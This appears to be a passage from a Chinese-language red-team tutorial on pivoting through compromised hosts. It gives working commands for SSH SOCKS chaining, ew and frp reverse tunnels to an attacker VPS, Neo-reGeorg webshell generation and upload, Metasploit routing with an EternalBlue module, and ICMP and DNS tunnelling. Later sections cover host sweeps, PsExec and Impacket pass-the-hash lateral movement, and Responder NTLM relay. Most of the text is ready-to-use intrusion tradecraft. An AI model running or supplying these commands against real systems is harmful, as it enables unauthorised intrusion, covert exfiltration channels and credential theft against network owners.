2.    ssh正向代理

ssh代理必然是A可以ssh到B上，因此常用正向代理，优点是使用简单。缺点是必须保持ssh连接，且需要ssh密码，这一般意味着需要root权限。

攻击机A 10.10.10.100
靶机B 3.3.3.3/192.168.1.1


如果可直接ssh到靶机上，可借用ssh完成隧道，windows上可用xshell轻松完成。如下图修改连接属性，建立个Socks5隧道即可。

此时在攻击机A上使用127.0.0.1:1080隧道即可访问192.168.1.1。

如果存在B——C——D，单向ssh靶机
攻击机A 10.10.10.100
靶机B 3.3.3.3/192.168.1.1
靶机C 192.168.1.100
靶机D 192.168.2.100

xshell在连接项目的属性中支持添加Socks5代理，因此仅用xshell即可完成整个多重代理。


SSH到靶机B，添加1080隧道
通过127.0.0.1:1080隧道代理SSH到靶机C，添加1081隧道
通过127.0.0.1:1081隧道代理SSH到靶机D，添加1082隧道
攻击机上使用127.0.0.1:1082隧道代理即可访问192.168.2.100

如果攻击机A为linux机器无法使用xshell，也可以用ssh完成多重隧道
攻击机A执行，并输入靶机B的密码

ssh -D 1080 -fN root@3.3.3.3


攻击机A执行，并输入靶机C的密码

ssh -o ProxyCommand='nc -x 127.0.0.1:1080 %h %p' -D 1081 -fN 192.168.1.100


攻击机A执行，并输入靶机D的密码

ssh -o ProxyCommand='nc -x 127.0.0.1:1081 %h %p' -D 1082 -fN 192.168.2.100


至此可通过127.0.0.1:1082代理访问192.168.2.100


3.    ew反向代理

使用ew常常是两边都无公网ip的情况，因此常用反向代理。ew缺点是作者已经删代码跑路，以及被大部分杀软盯上了。

https://github.com/z1un/ew


攻击机A 10.10.10.100
VPS B 2.2.2.2
靶机C 192.168.1.100

VPS B上执行

./ew -s rcsocks -l 5666 -e 8888


靶机C上执行

./ew -s rssocks -d 2.2.2.2 -e 8888


攻机A上设置socks5代理ip(2.2.2.2)端口(5666)，例如Proxifier设置192.168.*.*流量走2.2.2.2:5666即可。
也可以使用curl快速测试代理通道是否通。

curl --socks5 2.2.2.2:5667  cip.cc



如果攻击机为kali或者公网VPS自身，直接修改/etc/proxychains.conf，增加

socks5 2.2.2.2 5666


然后带proxychains执行

proxychains nmap -v -sV 192.168.1.100



如果还存在靶机D不出网，仅与靶机C连接
靶机D 192.168.2.100

VPS B上执行(将5666收到的代理请求转发给反连8888端口的主机)

./ew -s lcx_listen -l 5666 -e 8888


靶机C上执行(连接VPS B和靶机D)

./ew -s lcx_slave -d 2.2.2.2 -e 8888 -f 192.168.2.100 -g 9999


靶机D上执行

./ew -s ssocksd -l 9999



攻击机A直接使用2.2.2.2:5666代理即可。同理，如果还有多层环境，可以继续增加靶机C的ew命令。

4.    frp反向代理

frp更加稳定，且支持协议众多，支持客户端在服务端上开辟socks5代理端口，意味着VPS上开一个frps，即可通过客户端在VPS开多个socks5代理端口，非常方便。而且GO语言编写，扩展比较容易。但缺点是体积较大。

https://github.com/fatedier/frp
https://www.t00ls.net/viewthread.php?tid=59251
攻击机A 10.10.10.100
VPS B 2.2.2.2
靶机C 192.168.1.100

frp分客户端(frpc)和服务端(frps)，这里我用的是免配置参数版
VPS上执行

./frps -p 1080

靶机C上执行

./frpc -t 2.2.2.2 -p 1080 -f 9999


至此，可通过2.2.2.2:9999代理访问192.168.1.100

如果还存在靶机D不出网，仅与靶机C连接
靶机D 192.168.2.100

靶机C上执行

./frps -p 1080


靶机D上执行

./frpc -t 192.168.1.100 -p 1080 -f 9999


此时靶机C 192.168.1.100:9999为代理，只需要转发到VPS上即可。


由于参数版frp不支持端口转发，因此需要原版frp将192.168.1.100:9999转发到VPS。
VPS上执行
./frps -c frps.ini

[common]bind_port = 1080

靶机C上执行
./frpc -c frpc.ini

[common]server_addr = 2.2.2.2server_port = 1080
[ssh]type = tcplocal_ip = 127.0.0.1local_port = 9999remote_port = 9999

此时可通过2.2.2.2:9999代理访问192.168.2.100


5.    Neo-reGeorg正向代理

https://github.com/sensepost/reGeorg
https://github.com/L-codes/Neo-reGeorg
https://github.com/hayasec/reGeorg-Weblogic
webshell的socks5代理，第一个为原版，第二个为带密码的免杀版，第三个为weblogic专用版。常用第二个Neo-reGeorg。

攻击机A 10.10.10.100
靶机B 3.3.3.3/192.168.1.100
靶机C 192.168.1.101

先填密码生成webshell文件

python neoreg.py generate -k 123456


再上传webshell ，用webshell建立socks5隧道

python neoreg.py -k 123456 -p 8888 -u http://3.3.3.3/tunnel.php


此时即可使用127.0.0.1:8888代理访问3.3.3.3内网192.168.1.0/24。
如果想在靶机C上建立第二个socks5隧道，和ssh一样，只需要先在靶机C上上传webshell

python neoreg.py -k 123456 -p 8889 -u http://192.168.1.101/tunnel.php --proxy socks5://127.0.0.1:8889



如果靶机不出外网，仅web服务能和外网交互，就必须用到Neo-reGeorg。现代webshell管理工具通常也集成了代理功能。

6.    msf反向代理

常用于msf上线的后渗透，由于msf模块众多，设置路由后可以直接使用session进行代理攻击，无需转到攻击机上，较为方便。

攻击机A 10.10.10.100
VPS B 2.2.2.2
靶机C 192.168.1.100

靶机C执行shellcode，在VPS上搭建的msf上上线，过程略。

VPS上执行
查看局域网网关和子网掩码

ifconfig


进入后台，添加路由

backgroundroute add 192.168.1.0 255.255.255.0 1


查看路由，删除路由(无需删除)

routeroute del 192.168.1.0 255.255.255.0 1


在增加路由后，可用其他模块进行扫描或者攻击，以端口扫描为例

use scanner/portscan/tcpset PORTS 21,22,23,25,80,81,88,110,111,113,115,135,139,143,220,443,445,465,808,888,993,995,1080,1433,1434,1521,2049,2289,3306,3307,3389,4444,5000,5432,5672,5701,5900,6100,6379,7000,7001,8000,8001,8009,8080,8081,8082,8083,8085,8088,8089,8443,8848,8888,9000,9001,9080,9090,9081,9100,9200,9300,9999,10000,10001,11211,15672,20000,20001,27017set RHOSTS 192.168.1.100set THREADS 10run


更多内网常用模块如下，部分需要直接设置session代理

post/windows/gather/arp_scannerauxiliary/scanner/portscan/synauxiliary/scanner/smb/smb_ms17_010exploit/windows/smb/ms17_010_eternalblueadmin/mysql/mysql_sql



以及最重要的，建立一个socks隧道，以提供给攻击机使用，默认为0.0.0.0:1080，socks5。

use auxiliary/server/socks_proxyoptionsrun


最后使用2.2.2.2:1080即可使用代理访问192.168.1.100。不过这里msf已经通过路由帮你设置了一次规则，访问192.168.1.0/24会经过session 1，访问外网则会经过VPS。

7.    pingtunnel隧道

https://github.com/esrrhs/pingtunnel
一般仅在靶机不通外网，仅通ICMP，也就是ping命令时使用，需要配合其他socks代理工具，进行隧道搭建。


攻击机A 10.10.10.100
VPS B 2.2.2.2
靶机C 192.168.1.100

VPS上执行

sudo ./pingtunnel -type server -noprint 1 -nolog 1./ew -s rcsocks -l 5666 -e 8888


靶机C上执行

pingtunnel -type client -l 127.0.0.1:8888 -s 2.2.2.2 -t 2.2.2.2:8888 -tcp 1 -noprint 1 -nolog 1ew -s rssocks -d 127.0.0.1 -e 8888


使用2.2.2.2:5666代理即可访问192.168.1.100

这里本来ew本来是将socks5流量转发到本地的8888端口，但pingtunnel将其通过VSP上的pingtunnel-server转发到了VPS自己的8888端口上，完成了socks隧道搭建。

8.    Iodine隧道

https://github.com/yarrick/iodine
同样时不出外网，仅dns出网在实际环境中更为常见，此时就需要dns隧道。其中dnscat2，CS DNSBeacon都更接近于shell而不是隧道。Iodine为隧道，且更加稳定和快速，不过需要root权限，且ruby编写，编译麻烦。

攻击机A 10.10.10.100
VPS B 2.2.2.2
靶机C 192.168.1.100

先申请一个域名，test.com，新建NS记录，dns.test.com指向dnsns.test.com
再新建A记录，dnsns.test.com指向2.2.2.2
VPS B上执行

sudo iodined -fP 1234567 10.0.0.1 dnsns.test.xyz


靶机C上执行

sudo iodine -fP 1234567 2.2.2.2 dnsns.test.xyz


此时VPS B和靶机C会在同一局域网中，ip为10.0.0.1/3

靶机C上测试是否相通

ifconfigping -c 4 10.0.0.1


再用ew建立隧道，VPS B上执行

./ew -s rcsocks -l 5666 -e 8888


靶机C上执行

./ew -s rssocks -d 10.0.0.1 -e 8888


至此可通过2.2.2.2:5666代理访问192.168.1.100

9.    内网扫描/攻击

有时候代理扫描隧道不稳，这个时候，可能用一些非交互shell也能用的命令或者工具更好。
Windows存活ip探测ping

for /l %i in (1,1,255) do @ ping 192.168.1.%i -w 1 -n 1|find /i "ttl="@for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.1.%i & if errorlevel 1 (echo 192.168.1.%i>>D:\a.txt) else (echo 192.168.11.%i >>D:\b.txt)


Linux存活ip探测ping

for i in {1..254};do ping -c 1 192.168.1.$i;done


快速端口探测且指纹识别
https://github.com/4dogs-cn/TXPortMap

TXPortMap -i 192.168.1.1 -p 1-65535


有Windows时还需要熟练使用域渗透/横向工具

PSTools系列工具，ipc$横向
https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec

PsExec.exe \\192.168.1.100 -u administrator -p 123456 cmd


Impacket套件，pth横向，同时也支持ipc$横向
https://github.com/SecureAuthCorp/impacket/

smbexec.exe ADdomain/administrator:ADpassword@172.16.10.200smbexec.exe ADdomain/administrator@172.16.10.200 -hashes :NTLMhash


Responder套件，获取Net-NTLM，中继(Relay)工具
https://github.com/SpiderLabs/Responder

sudo python Responder.py -I eth0
